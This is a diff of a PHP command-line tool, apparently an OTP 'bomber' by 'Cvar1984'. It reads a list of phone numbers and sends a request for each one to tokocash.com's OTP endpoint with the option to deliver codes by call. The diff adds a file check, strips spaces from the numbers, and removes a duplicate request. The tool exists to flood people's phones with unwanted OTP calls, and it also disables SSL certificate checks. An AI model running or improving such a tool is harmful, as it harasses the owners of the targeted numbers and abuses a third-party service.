@@ -32,12 +32,9 @@ function post_data($url,$data) {
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-	ob_start();
 	return curl_exec($ch);
-	ob_end_clean();
 	curl_close($ch);
 }
-// end of function
 echo $Y.
 "
  _     _ _        ___ _____ ____  
@@ -53,12 +50,13 @@ echo $B."\nVersion : 2.1                        ".$R.'+';
 echo $B."\nDate    : 13-03-2018                 ".$R.'+';
 echo $R."\n++++++++++++++++++++++++++++++++++++++".$G.$X."\n\n";
 isset($argv[1]) OR die($RR."[!] Input No List [!]\n".$X);
-
+if(!file_exists($argv[1])) {
+	die($RR."[!] File Not Exists [!]".$X."\n");
+}
 $argv[1]=explode("\n", file_get_contents($argv[1]));
-//file_put_contents('array.php','<?php return'.var_export($argv[1],true).";\n");
+$argv[1]=str_replace(' ','',$argv[1]);
 foreach($argv[1] as $argv[1]) {
+	echo "Send OTP To -> ".$G.$argv[1].$X."\n";
 	post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=call");
-	post_data('https://www.tokocash.com/oauth/otp',"msisdn={$argv[1]}&accept=");
-	echo "Send OTP To -> ".$GG.$argv[1].$X."\n";
 }
 die($Y.'=========================== Cvar1984 ))=====(@)>'.$X."\n");
